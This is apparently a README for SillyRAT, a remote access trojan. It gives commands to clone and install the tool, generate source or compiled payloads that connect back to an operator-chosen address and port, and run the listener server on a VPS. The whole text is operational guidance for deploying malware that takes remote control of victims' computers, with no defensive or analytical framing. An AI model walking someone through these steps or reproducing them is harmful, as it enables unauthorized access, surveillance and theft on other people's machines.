# Installation
The tool is tested on **Parrot OS** with **Python 3.8**. 
Follow the steps for installation:

```python
git clone https://github.com/mil3st3ch3/SillyRAT.git
cd SillyRAT/
pip3 install -r requirements.txt
```

## Documentation
### Generating Payload
You can get the payload file in two ways: 
<ul>
    <li>Source File</li>
    <li>Compiled File</li>
</ul>
The source file is to remain same on all platforms. So, you can generate it on one platform and use it on the other. Getting the source file: 

```
$ python3 server.py generate --address 134.276.92.1 --port 2999 --output /tmp/payload.py --source
```

The compiled version has to generated on the respective platform. For example, you can't generate an .exe file on Linux. You specifically have to be on Windows. The tool is still under testing. So, all kinds of errors are accepted. Make sure to open an issue though. Generating the Compiled Version for Linux:

```
$ python3 server.py generate --address 134.276.92.1 --port 2999 --output /tmp/filer
```

### Running Server
The server must be executed on Linux. You can buy a VPS or Cloud Server for connections. For the record, the server doesn't store any session from last run. So, all the progress will lost once the server application gets terminated. Running your server:
```
$ python3 sillyrat.py bind --address 0.0.0.0 --port 2999
```
